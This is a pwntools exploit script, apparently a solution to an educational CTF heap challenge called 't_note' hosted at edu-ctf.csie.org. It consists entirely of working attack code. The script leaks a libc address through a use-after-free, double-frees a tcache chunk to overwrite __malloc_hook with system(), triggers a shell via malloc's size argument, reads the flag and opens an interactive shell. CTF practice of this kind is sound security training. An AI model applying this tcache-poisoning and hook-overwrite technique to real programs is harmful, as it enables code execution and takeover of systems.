'/ Note keeper; Libc implements Tcache /'
from pwn import *
context(arch = 'amd64', os = 'linux')
r = remote('edu-ctf.csie.org', 10179)
#r = process('./t_note')
def add( size, word ):
	r.sendafter('> ','1')
	r.sendafter('Size: ', str(size))
	r.sendafter('Note: ', word)
def show( index ):
	r.sendafter('> ','2')
	r.sendafter('Index: ', str(index))
def delete( index ):
	r.sendafter('> ','3')
	r.sendafter('Index: ', str(index))

add(0x410, '0') # large bin size will not go to Tcache
add(0x10, '1')
delete(0)
show(0)
r.recvline()
libc = u64( r.recv(6) + b'\0\0' ) - 0x3ebca0
success(hex(libc))

malloc_hook = libc + 0x3eb1a0 + 0xa90
system_func = libc + 0x04f440
bin_sh_ptr  = libc + 0x1b3e9a
delete(1)
delete(1) # can directly double free
add(0x10, p64(malloc_hook)) # tcache points to data, not head of chunck
add(0x10, '.')
add(0x10, p64(system_func))

r.sendafter('> ','1')
r.sendafter('Size: ', str(bin_sh_ptr))
r.sendline('cat /home/`whoami`/flag')
r.interactive()
